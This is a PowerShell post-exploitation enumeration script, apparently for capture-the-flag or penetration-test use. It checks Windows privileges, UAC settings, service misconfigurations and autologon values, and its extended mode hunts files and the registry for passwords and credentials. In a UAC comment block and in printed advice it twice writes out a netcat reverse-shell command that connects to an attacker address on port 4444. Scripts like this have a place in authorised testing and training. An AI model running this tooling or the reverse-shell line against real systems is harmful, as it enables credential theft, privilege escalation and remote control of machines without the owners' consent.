# Usage
# run script directly from powershell for quick standard checks
# 
# For quick standard checks directly from CMD:
# powershell -nologo -executionpolicy bypass -file basic_enum.ps1
#
# To run extensive file searches use extended parameter (it can take a long time, be patient!):
# PS C:\> .\basic_enum.ps1 extended
# From CMD:
# powershell -nologo -executionpolicy bypass -file basic_enum.ps1 extended


param($extended)
 
$lines="------------------------------------------"

function whost($a) {
    Write-Host
    Write-Host -ForegroundColor Green $lines
    Write-Host -ForegroundColor Green " "$a 
    Write-Host -ForegroundColor Green $lines
}

function RecentHotfix {
    # Retrieve the most recent hotfix
     $lastfix=Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1 | Select-Object HotFixID, InstalledOn
     $installedDate = [datetime]::Parse($lastfix.InstalledOn)
     $formattedOutput = $installedDate.ToString("MM yyyy") # Format as Month Year
     $oneMonthAgo = (Get-Date).AddMonths(-1)
     
     # Check if the installed date is older than one month
	if ($installedDate -lt $oneMonthAgo) {
    # Format the output in red
    	Write-Host $lastfix.HotFixID,$formattedOutput -ForegroundColor Red
	} else {
    # Format normally if within one month
    	Write-Host $lastfix.HotFixID,$formattedOutput
	}
}

function enum_privs {
# Define a 3-dimensional array with specified values
$privilegesArray = @(
    @("SeAssignPrimaryTokenPrivilege", "Allows a process to replace the primary token of a process.", 8),
    @("SeAuditPrivilege", "Allows a process to generate audit-log entries.", 4),
    @("SeBackupPrivilege", "Allows a process to back up files and directories.", 6),
    @("SeChangeNotifyPrivilege", "Allows a process to receive notifications of file or directory changes.", 3),
    @("SeCreateGlobalPrivilege", "Allows a process to create global objects in the namespace.", 5),
    @("SeCreatePagefilePrivilege", "Allows a process to create and modify paging files.", 7),
    @("SeCreatePermanentPrivilege", "Allows a process to create permanent objects.", 6),
    @("SeCreateSymbolicLinkPrivilege", "Allows a process to create symbolic links.", 5),
    @("SeCreateTokenPrivilege", "Allows a process to create an access token.", 9),
    @("SeDebugPrivilege", "Allows a process to debug and adjust the memory of a process owned by another account.", 9),
    @("SeDelegateSessionUserImpersonatePrivilege", "Allows a process to impersonate another user.", 8),
    @("SeEnableDelegationPrivilege", "Allows a user to enable computer and user accounts to be trusted for delegation.", 7),
    @("SeImpersonatePrivilege", "Allows a process to impersonate a client after authentication.", 8),
    @("SeIncreaseBasePriorityPrivilege", "Allows a process to increase the base priority of a process.", 4),
    @("SeIncreaseQuotaPrivilege", "Allows a process to increase the quota assigned to a process.", 7),
    @("SeIncreaseWorkingSetPrivilege", "Allows a process to increase the working set of a process.", 6),
    @("SeLoadDriverPrivilege", "Allows a process to load and unload device drivers.", 9),
    @("SeLockMemoryPrivilege", "Allows a process to lock physical pages in memory.", 5),
    @("SeMachineAccountPrivilege", "Allows a user to add a computer to a domain.", 6),
    @("SeManageVolumePrivilege", "Allows a process to perform volume maintenance tasks.", 8),
    @("SeProfileSingleProcessPrivilege", "Allows a process to profile a single process.", 5),
    @("SeRelabelPrivilege", "Allows a process to modify the mandatory integrity level of an object.", 7),
    @("SeRemoteShutdownPrivilege", "Allows a process to shut down a system from a remote location.", 8),
    @("SeReserveProcessorPrivilege", "Allows a process to reserve processor resources.", 4),
    @("SeRestorePrivilege", "Allows a process to restore files and directories.", 6),
    @("SeSecurityPrivilege", "Allows a process to manage auditing and security log entries.", 8),
    @("SeShutdownPrivilege", "Allows a process to shut down a local system.", 7),
    @("SeSyncAgentPrivilege", "Allows a process to synchronize files with a remote server.", 4),
    @("SeSystemEnvironmentPrivilege", "Allows a process to modify system environment variables.", 7),
    @("SeSystemProfilePrivilege", "Allows a process to collect profiling information for the entire system.", 6),
    @("SeSystemtimePrivilege", "Allows a process to change the system time.", 5),
    @("SeTakeOwnershipPrivilege", "Allows a process to take ownership of an object.", 9),
    @("SeTcbPrivilege", "Allows a process to act as part of the operating system.", 10),
    @("SeTimeZonePrivilege", "Allows a process to change the time zone.", 3),
    @("SeTrustedCredManAccessPrivilege", "Allows a process to access Credential Manager as a trusted caller.", 6),
    @("SeUndockPrivilege", "Allows a process to remove the computer from docking station.", 3),
    @("SeUnsolicitedInputPrivilege", "Allows a process to read unsolicited input from terminal device.", 4)
    
)

# Run the CMD command and capture the output
$output = cmd.exe /c "whoami /priv"

# Initialize an array to hold words starting with "Se", excluding specific words
$seWords = @()

# Define words to exclude
$excludeWords = @('set', 'session', 'security')

# Process each line of output
foreach ($line in $output) {
    # Split the line into words
    $words = $line -split '\s+'
    
    # Filter words that start with "Se" and are not in the exclude list
    $filteredWords = $words | Where-Object { $_ -like 'Se*' -and $_.ToLower() -notin $excludeWords }
    
    # Add filtered words to the array
    $seWords += $filteredWords
}
Write-Host "MANUAL: https://redteamrecipe.com/windows-privileges-for-fun-and-profit#heading-setakeownership"

# Perform an action on each word in seWords
foreach ($word in $seWords) {

foreach ($item in $privilegesArray) {
    # Check if the first element matches the word
    if ($item[0] -eq $word) {
        if ($item[2] -ge 8) {
            Write-Host "[!] high rank $($item[2]),  $($item[0]) : $($item[1])" -ForegroundColor Red
        } else {
            Write-Host "[*] ok  $($item[0])"
        }
    }
}

}

}


function enum_folders {
# Define a list of standard folders
$standardFolders = @(
    'Program Files',
    'Program Files (x86)',
    'Windows',
    'Users',
    'ProgramData',
    'Temp',
    'Documents and Settings'
)

# Get the list of folders in C
$foldersInC = Get-ChildItem -Path "C:\" -Directory | Select-Object -ExpandProperty Name

# Initialize an array to hold non-standard folders
$nonStandardFolders = @()

# Check each folder in C:\ against the standard folder list
foreach ($folder in $foldersInC) {
    if ($standardFolders -notcontains $folder) {
        $nonStandardFolders += $folder
    }
}

# Output the non-standard folders
if ($nonStandardFolders.Count -eq 0) {
    Write-Output "No non-standard folders found in C:\."
} else {
    Write-Output "Non-standard folders found in C:\:"
    $nonStandardFolders | ForEach-Object { Write-Output $_ }
}

}


function enum_UAC {
<#
UAC Bypass Checker
read: https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
If it's 1  then UAC is activated, if its 0 or it doesn't exist, then UAC is inactive

check which level 
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

    If     0   then, UAC won't prompt (like disabled)

    If     1   the admin is asked for username and password to execute the binary with high rights (on Secure Desktop)

    If     2   (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)

    If     3    like 1 but not necessary on Secure Desktop

    If     4    like 2 but not necessary on Secure Desktop

    if     5    (default) it will ask the administrator to confirm to run non Windows binaries with high privileges

LocalAccountTokenFilterPolicy If the value is 0 , then, only the RID 500 user (built-in Administrator)
and if its 1, all accounts inside "Administrators" group can do them


FilterAdministratorToken If 0 (default), the built-in Administrator account can do remote administration tasks and if 
1 the built-in account Administrator cannot do remote administration tasks, unless LocalAccountTokenFilterPolicy is set to 1

Summary

    If EnableLUA=0 or doesn't exist, no UAC for anyone. We can do: Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"

    If EnableLua=1 and LocalAccountTokenFilterPolicy=1, No UAC for anyone

    If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0, No UAC for RID 500 (Built-in Administrator)

    If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1, UAC for everyone

#>

	
        $EnableLUA = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
	$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
	$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
        $LocalAccountTokenFilterPolicy = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).LocalAccountTokenFilterPolicy
        $FilterAdministratorToken = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).FilterAdministratorToken
        Echo "[*] Checking UAC status.`nSettings:`nEnableLUA:$EnableLUA `nConsent Prompt:$ConsentPrompt `nSecureDesktop Prompt:$SecureDesktopPrompt `nLocalAccountTokenFilter Policy:$LocalAccountTokenFilterPolicy `nFilterAdministrator Token:$FilterAdministratorToken"


# Capture the output of whoami /groups
$output = whoami /groups

# Define SID for the Administrators group and Medium Integrity Level
$administratorsSID = "S-1-5-32-544"  # SID for the Administrators group
$mediumIntegritySID = "S-1-16-8192"  # SID for Medium Mandatory Integrity Level

# Initialize flags
$isAdministrator = $false
$isMediumIntegrity = $false
$isUAC =$true

# Process each line of output
foreach ($line in $output) {
    # Check if user is part of the Administrators group
    if ($line -like "*$administratorsSID*") {
        $isAdministrator = $true
    }
    
    # Check if current process is running at Medium Integrity Level
    if ($line -like "*$mediumIntegritySID*") {
        $isMediumIntegrity = $true
    }
}

if($EnableLUA -Eq 0) {$isUAC=$false}
Echo "`n[*] Summary:`nUser Admin status: $isAdministrator `nMedium status: $isMediumIntegrity `nUAC enabled: $isUAC "
Write-Host ("TOTAL:" +($isAdministrator -and $isMediumIntegrity -and $isUAC)) -ForegroundColor White

#Evaluation
"`n[*] Details and analysis:"

if($isUAC -Eq 0){
		"[+] UAC is Disabled `nTry execution: Start-Process powershell -Verb runAs C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444 "
		}

if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
		"[!] UAC is set to 'Always Notify', I can't help you."
		exit
		}
	else{
		Echo "UAC Status OK and set to 'Default'."
		}


}

$basic_enum_cmds = [ordered]@{

    'HOSTNAME'                                    = 'Start-Process "hostname" -NoNewWindow -Wait | ft';
    'Basic System Information'                    = 'Start-Process -FilePath "cmd.exe" -ArgumentList "/c systeminfo | findstr /B /C:`"OS Name`" /C:`"OS Version`" /C:`"System Type`"" -NoNewWindow -Wait';
    'Most recent patch'                           = 'RecentHotfix';
    'USERNAME'                                    = 'whoami';
    'Admin?'                                      = '$null -ne (whoami /groups /fo csv | ConvertFrom-Csv | Where-Object { $_.SID -eq "S-1-5-32-544" })';
    'High levels'                                 = '(whoami /groups /fo csv | ConvertFrom-Csv | Where-Object { $_.SID -eq "S-1-16-12288" -or $_.SID -eq "S-1-16-16384" })';
    'ctf: UAC status'                             = 'enum_UAC';
    'ctf:Enumerate current user privileges'       = 'enum_privs';
    'User Groups'                                 = 'net user $env:USERNAME | Select-String -Pattern "Local Group Memberships|Global Group Memberships"';
    'Logged in Users'                             = 'Start-Process "quser" -NoNewWindow -Wait | ft';
    'all users and domain SID'                    = 'wmic useraccount get domain,name,sid ';
    'ctf:Interesting folders'                     = 'enum_folders';
    '1:Cool files (txt, exe, pdf, kdbx)'          = 'Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe,*.xml,*.config -Recurse -ErrorAction SilentlyContinue| Select-Object -ExpandProperty FullName';
    '2:Cool files (tree in Users)'                = 'tree C:\Users /F';
    '3:Cool files (kdbx)'                         = 'Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue';
    '4:Cool files GIT'                            = 'Get-ChildItem -Path C:\ -Filter .gitignore -Recurse -ErrorAction SilentlyContinue';
    '1:Powershell history'                        = 'Get-History'; 
    '2:Powershell history'                        = 'type (Get-PSReadlineOption).HistorySavePath';   

}

$standard_commands = [ordered]@{

    'Basic System Information'                    = 'Start-Process "systeminfo" -NoNewWindow -Wait';
    'Environment Variables'                       = 'Get-ChildItem Env: | ft Key,Value';
    'Network Information'                         = 'Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address';
    'DNS Servers'                                 = 'Get-DnsClientServerAddress -AddressFamily IPv4 | ft';
    'ARP cache'                                   = 'Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State';
    'Routing Table'                               = 'Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex';
    'Connected Drives'                            = 'Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft';
    'Current User'                                = 'Write-Host $env:UserDomain\$env:UserName';
    'User Privileges'                             = 'start-process "whoami" -ArgumentList "/priv" -NoNewWindow -Wait | ft';
    'User Groups'                                 = 'Start-process "whoami" -ArgumentList "/groups" -NoNewWindow -Wait | ft';
    'Local Users'                                 = 'Get-LocalUser | ft Name,Enabled,LastLogon';
    'Logged in Users'                             = 'Start-Process "qwinsta" -NoNewWindow -Wait | ft';
    'Credential Manager'                          = 'start-process "cmdkey" -ArgumentList "/list" -NoNewWindow -Wait | ft'
    'User Autologon Registry Items'               = 'Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" | select "Default*" | ft';
    'Local Groups'                                = 'Get-LocalGroup | ft Name';
    'Local Administrators'                        = 'Get-LocalGroupMember Administrators | ft Name, PrincipalSource';
    'User Directories'                            = 'Get-ChildItem C:\Users | ft Name';
    'Searching for SAM backup files'              = 'Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM';
    'Running Processes'                           = 'gwmi -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize';
    'Installed Software Directories'              = 'Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | ft Parent,Name,LastWriteTime';
    'Software in Registry'                        = 'Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name';
    'Folders with Everyone Permissions'           = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "Everyone"} } catch {}} | ft';
    'Folders with BUILTIN\User Permissions'       = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "BUILTIN\Users"} } catch {}} | ft';
    'Checking registry for AlwaysInstallElevated' = 'Test-Path -Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer" | ft';
    'Unquoted Service Paths'                      = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike ''"*''} | select PathName, DisplayName, Name | ft';
    'Scheduled Tasks'                             = 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State';
    'Tasks Folder'                                = 'Get-ChildItem C:\Windows\Tasks | ft';
    'Startup Commands'                            = 'Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl';
    
}



$extended_commands = [ordered]@{
     
    'Firewall Config'                          = 'Start-Process "netsh" -ArgumentList "firewall show config" -NoNewWindow -Wait | ft';
    'Network Connections - all'                = 'Start-Process "netstat" -ArgumentList "-ano" -NoNewWindow -Wait | ft';
    'Searching for Unattend and Sysprep files' = 'Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | Out-File C:\temp\unattendfiles.txt';
    'Searching for web.config files'           = 'Get-Childitem –Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\temp\webconfigfiles.txt';
    'Searching for other interesting files'    = 'Get-Childitem –Path C:\ -Include *password*,*cred*,*vnc* -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\temp\otherfiles.txt';
    'Searching for various config files'       = 'Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\temp\configfiles.txt'
    'Searching HKLM for passwords'             = 'reg query HKLM /f passw /t REG_SZ /s | Out-File C:\temp\hklmpasswords.txt';
    'Searching HKCU for passwords'             = 'reg query HKCU /f passw /t REG_SZ /s | Out-File C:\temp\hkcupasswords.txt';
    'Look for passwords C:\Users by pattern'   = 'Get-ChildItem -Path C:\Users -Recurse -Include *.xml, *.ini, *.txt, *.csv, *.config | Select-String -Pattern "auth|authentication|authorization|bearer|secret|token|pass|password|username" -CaseSensitive:$false| Select-Object Path, Line';
    'Searching for files with passwords'       = 'Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike "*C:\temp*" -and $_.PSParentPath -notlike "*Reference Assemblies*" -and $_.PSParentPath -notlike "*Windows Kits*"}| Select-String -Pattern "password" | Out-File C:\temp\password.txt';
    
}
function RunCommands($commands) {
    ForEach ($command in $commands.GetEnumerator()) {
        whost $command.Name
        Invoke-Expression $command.Value
    }
}

whost "Windows Enumeration Script v 6
          by Merman

To run extensive file searches and password hunting  > extended 
it can take a long time:
# PS C:\> .\windows_basic.ps1 extended       
       
       "

RunCommands($basic_enum_cmds)
RunCommands($standard_commands)

if ($extended) {
    if ($extended.ToLower() -eq 'extended') {
        $result = Test-Path C:\temp
        if ($result -eq $False) {
            New-Item C:\temp -type directory
        }
        whost "Results writing to C:\temp\
    This may take a while..."
        RunCommands($extended_commands)
        whost "Script Finished! Check your files in C:\temp\"
    }
}
else {
    whost "Script finished!"
}





